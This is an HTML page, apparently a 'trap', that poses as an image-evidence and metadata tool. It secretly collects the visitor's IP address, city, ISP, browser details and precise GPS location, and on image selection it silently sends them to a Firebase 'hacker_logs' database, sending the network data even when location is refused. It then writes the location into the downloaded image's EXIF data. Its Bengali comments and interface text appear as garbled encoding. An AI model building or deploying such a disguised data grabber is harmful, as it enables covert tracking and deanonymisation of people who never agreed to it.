<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Secure Proof Maker (Trap)</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/piexifjs/1.0.6/piexif.js"></script>
    
    <script type="module">
        // Firebase ‡¶ï‡¶®‡¶´‡¶ø‡¶ó‡¶æ‡¶∞‡ßá‡¶∂‡¶® (‡¶§‡ßã‡¶∞ ‡¶®‡¶ø‡¶ú‡ßá‡¶∞‡¶ü‡¶æ ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶¨‡¶∏‡¶æ‡¶¨‡¶ø)
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDxxxxxxxxx...",  // ‡¶§‡ßã‡¶∞ API Key
            authDomain: "your-app.firebaseapp.com",
            databaseURL: "https://your-app-default-rtdb.firebaseio.com", // ‡¶§‡ßã‡¶∞ ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏ URL
            projectId: "your-app-id",
            storageBucket: "your-app.appspot.com",
            messagingSenderId: "123456789",
            appId: "1:123456789:web:xxxxxx"
        };

        // Firebase ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶ï‡¶∞‡¶æ
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ‡¶°‡¶æ‡¶ü‡¶æ‡¶¨‡ßá‡¶∏‡ßá ‡¶§‡¶•‡ßç‡¶Ø ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã‡¶∞ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® (Global Scope ‡¶è ‡¶Ü‡¶®‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø window ‡¶§‡ßá ‡¶∏‡ßá‡¶ü ‡¶ï‡¶∞‡¶≤‡¶æ‡¶Æ)
        window.sendDataToFirebase = function(data) {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            set(newLogRef, {
                timestamp: new Date().toString(),
                ...data
            }).then(() => {
                console.log("Data logged silently!");
            }).catch((error) => {
                console.error("Error logging data: ", error);
            });
        }
    </script>

    <style>
        /* ‡¶§‡ßã‡¶∞ ‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶∏‡ßç‡¶ü‡¶æ‡¶á‡¶≤‡¶á ‡¶∞‡ßá‡¶ñ‡ßá‡¶õ‡¶ø, ‡¶ì‡¶ü‡¶æ ‡¶∏‡ßÅ‡¶®‡ßç‡¶¶‡¶∞ ‡¶õ‡¶ø‡¶≤ */
        :root { --bg-color: #e0e5ec; --text-color: #4a4a4a; --shadow-light: #ffffff; --shadow-dark: #a3b1c6; --accent: #007bff; --success: #00b894; --danger: #ff4757; }
        body { background-color: var(--bg-color); color: var(--text-color); font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .mobile-container { width: 90%; max-width: 400px; background-color: var(--bg-color); border-radius: 20px; padding: 20px; box-shadow: 10px 10px 20px var(--shadow-dark), -10px -10px 20px var(--shadow-light); min-height: 600px; text-align: center; }
        h2 { text-align: center; color: var(--text-color); margin-bottom: 20px; }
        .neu-btn { width: 100%; padding: 15px; border: none; border-radius: 12px; background: var(--bg-color); box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); color: var(--text-color); font-weight: bold; font-size: 16px; cursor: pointer; outline: none; transition: 0.2s; margin-bottom: 15px; }
        .neu-btn:active { box-shadow: inset 4px 4px 8px var(--shadow-dark), inset -4px -4px 8px var(--shadow-light); }
        .neu-btn:disabled { color: #aaa; box-shadow: none; cursor: not-allowed; }
        .btn-select { color: var(--accent); } .btn-save { color: var(--success); }
        .upload-area { text-align: center; padding: 20px; border-radius: 15px; box-shadow: inset 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); margin-bottom: 25px; }
        input[type="file"] { display: none; }
        #preview { width: 150px; height: 150px; object-fit: contain; border-radius: 10px; margin-top: 15px; display: none; box-shadow: 4px 4px 8px var(--shadow-dark), -4px -4px 8px var(--shadow-light); border: 3px solid var(--bg-color); margin-left: auto; margin-right: auto; }
        .status-box { padding: 15px; border-radius: 12px; margin-bottom: 20px; font-size: 14px; font-weight: bold; display: none; }
        .status-ok { color: var(--success); box-shadow: 6px 6px 12px var(--shadow-dark), -6px -6px 12px var(--shadow-light); }
        .status-error { color: var(--danger); }
    </style>
</head>
<body>

    <div class="mobile-container">
        <h2>üîç Digital Evidence Tool</h2>
        <p style="font-size: 12px; color: #666;">Secure Image Metadata Injector</p>

        <div class="upload-area">
            <input type="file" id="fileInput" accept="image/jpeg, image/jpg, image/png">
            <button class="neu-btn btn-select" onclick="document.getElementById('fileInput').click()">
                üìÇ ‡¶õ‡¶¨‡¶ø ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡ßÅ‡¶®
            </button>
            <img id="preview" src="">
        </div>

        <div id="statusBox" class="status-box"></div>

        <div id="actionButtons" style="display:none;">
            <button id="saveBtn" class="neu-btn btn-save" onclick="processAndTrap()" disabled>
                üíæ ‡¶™‡ßç‡¶∞‡¶∏‡ßá‡¶∏ ‡¶è‡¶¨‡¶Ç ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡ßÅ‡¶®
            </button>
        </div>
    </div>

    <script>
        let currentImgData = null;
        let userLat = null; let userLng = null;
        let ipData = {};

        // ‡ßß. ‡¶Ü‡¶á‡¶™‡¶ø ‡¶è‡¶°‡ßç‡¶∞‡ßá‡¶∏ ‡¶è‡¶¨‡¶Ç ‡¶®‡ßá‡¶ü‡¶ì‡ßü‡¶æ‡¶∞‡ßç‡¶ï ‡¶á‡¶®‡¶´‡ßã ‡¶¨‡ßá‡¶∞ ‡¶ï‡¶∞‡¶æ (API ‡¶¶‡¶ø‡ßü‡ßá)
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                ipData = data;
                console.log("Network Info Captured");
            })
            .catch(error => console.log("IP Fetch Error"));

        document.getElementById('fileInput').addEventListener('change', function(e) {
            let file = e.target.files[0];
            if (file) {
                let reader = new FileReader();
                reader.onload = function(event) {
                    currentImgData = event.target.result;
                    document.getElementById('preview').src = currentImgData;
                    document.getElementById('preview').style.display = 'block';
                    document.getElementById('actionButtons').style.display = 'block';
                    
                    // ‡¶õ‡¶¨‡¶ø ‡¶∏‡¶ø‡¶≤‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶≤‡ßá‡¶á ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶ö‡¶æ‡¶ì‡ßü‡¶æ ‡¶∂‡ßÅ‡¶∞‡ßÅ ‡¶π‡¶¨‡ßá
                    checkLocation();
                }
                reader.readAsDataURL(file);
            }
        });

        function checkLocation() {
            let statusBox = document.getElementById('statusBox');
            statusBox.style.display = 'block';
            statusBox.innerText = "‚è≥ ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶è‡¶¨‡¶Ç ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á ‡¶π‡¶ö‡ßç‡¶õ‡ßá...";

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        userLat = position.coords.latitude;
                        userLng = position.coords.longitude;
                        document.getElementById('saveBtn').disabled = false;
                        statusBox.className = 'status-box status-ok';
                        statusBox.innerHTML = `‚úÖ ‡¶°‡¶ø‡¶≠‡¶æ‡¶á‡¶∏ ‡¶≠‡ßá‡¶∞‡¶ø‡¶´‡¶æ‡¶á‡¶°! <br> ‡¶∏‡ßá‡¶≠ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶™‡ßç‡¶∞‡¶∏‡ßç‡¶§‡ßÅ‡¶§‡•§`;
                        
                        // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡¶æ‡¶ì‡ßü‡¶æ‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶∏‡¶æ‡¶•‡ßá‡¶á ‡¶ö‡ßÅ‡¶™‡¶ø‡¶∏‡¶æ‡¶∞‡ßá Firebase ‡¶è ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡ßá‡¶¨
                        logToFirebase(); 
                    },
                    function(error) {
                        statusBox.innerText = "‚ùå ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶™‡¶æ‡¶∞‡¶Æ‡¶ø‡¶∂‡¶® ‡¶¶‡¶ø‡¶®, ‡¶®‡¶æ‡¶π‡¶≤‡ßá ‡¶ï‡¶æ‡¶ú ‡¶ï‡¶∞‡¶¨‡ßá ‡¶®‡¶æ‡•§";
                        // ‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶®‡¶æ ‡¶¶‡¶ø‡¶≤‡ßá‡¶ì ‡¶Ü‡¶á‡¶™‡¶ø ‡¶è‡¶°‡ßç‡¶∞‡ßá‡¶∏ ‡¶™‡¶æ‡¶†‡¶ø‡ßü‡ßá ‡¶¶‡ßá‡¶¨
                        logToFirebase(false); 
                    },
                    { enableHighAccuracy: true }
                );
            }
        }

        function logToFirebase(hasLocation = true) {
            let deviceLog = {
                ip: ipData.ip || "Unknown",
                city: ipData.city || "Unknown",
                isp: ipData.org || "Unknown",
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                latitude: hasLocation ? userLat : "Denied",
                longitude: hasLocation ? userLng : "Denied",
                status: hasLocation ? "Success - Full Info" : "Partial - No GPS"
            };

            // Firebase ‡¶è ‡¶°‡¶æ‡¶ü‡¶æ ‡¶™‡¶æ‡¶†‡¶æ‡¶®‡ßã ‡¶π‡¶ö‡ßç‡¶õ‡ßá (‡¶´‡¶æ‡¶Ç‡¶∂‡¶®‡¶ü‡¶ø ‡¶â‡¶™‡¶∞‡ßá ‡¶Æ‡¶°‡¶ø‡¶â‡¶≤‡ßá ‡¶°‡¶ø‡¶´‡¶æ‡¶á‡¶® ‡¶ï‡¶∞‡¶æ ‡¶Ü‡¶õ‡ßá)
            if(window.sendDataToFirebase) {
                window.sendDataToFirebase(deviceLog);
            }
        }

        function processAndTrap() {
            // ‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶Æ‡¶§‡¶á ‡¶á‡¶Æ‡ßá‡¶ú‡ßá ‡¶Æ‡ßá‡¶ü‡¶æ‡¶°‡¶æ‡¶ü‡¶æ ‡¶á‡¶®‡¶ú‡ßá‡¶ï‡ßç‡¶ü ‡¶ï‡¶∞‡¶æ ‡¶π‡¶ö‡ßç‡¶õ‡ßá
            // ‡¶Ø‡¶æ‡¶§‡ßá ‡¶°‡¶æ‡¶â‡¶®‡¶≤‡ßã‡¶° ‡¶ï‡¶∞‡¶æ ‡¶´‡¶æ‡¶á‡¶≤‡ßá ‡¶™‡ßç‡¶∞‡¶Æ‡¶æ‡¶£ ‡¶•‡¶æ‡¶ï‡ßá
            if (!currentImgData || !userLat) {
                alert("‡¶≤‡ßã‡¶ï‡ßá‡¶∂‡¶® ‡¶õ‡¶æ‡ßú‡¶æ ‡¶™‡ßç‡¶∞‡ßÅ‡¶´ ‡¶§‡ßà‡¶∞‡¶ø ‡¶π‡¶¨‡ßá ‡¶®‡¶æ!");
                return;
            }

            let zeroth = {};
            let exif = {};
            let gps = {};

            zeroth[piexif.ImageIFD.Make] = ipData.org || "Unknown ISP"; // ‡¶π‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶∞‡ßá‡¶∞ ‡¶á‡¶®‡ßç‡¶ü‡¶æ‡¶∞‡¶®‡ßá‡¶ü ‡¶™‡ßç‡¶∞‡¶≠‡¶æ‡¶á‡¶°‡¶æ‡¶∞ ‡¶®‡¶æ‡¶Æ
            zeroth[piexif.ImageIFD.Model] = ipData.ip || "IP Address"; // ‡¶π‡ßç‡¶Ø‡¶æ‡¶ï‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Ü‡¶á‡¶™‡¶ø
            
            // GPS ‡¶∏‡ßá‡¶ü‡¶Ü‡¶™
            gps[piexif.GPSIFD.GPSLatitudeRef] = userLat < 0 ? 'S' : 'N';
            gps[piexif.GPSIFD.GPSLatitude] = piexif.GPSHelper.degToDmsRational(Math.abs(userLat));
            gps[piexif.GPSIFD.GPSLongitudeRef] = userLng < 0 ? 'W' : 'E';
            gps[piexif.GPSIFD.GPSLongitude] = piexif.GPSHelper.degToDmsRational(Math.abs(userLng));

            let exifObj = {"0th": zeroth, "Exif": exif, "GPS": gps};
            let exifStr = piexif.dump(exifObj);
            let newImage = piexif.insert(exifStr, currentImgData);

            let link = document.createElement('a');
            link.href = newImage;
            link.download = "Evidence_" + Date.now() + ".jpg";
            link.click();
            
            alert("‚úÖ ‡¶§‡¶•‡ßç‡¶Ø ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶∏‡¶Ç‡¶ó‡ßç‡¶∞‡¶π ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá!");
        }
    </script>
</body>
</html>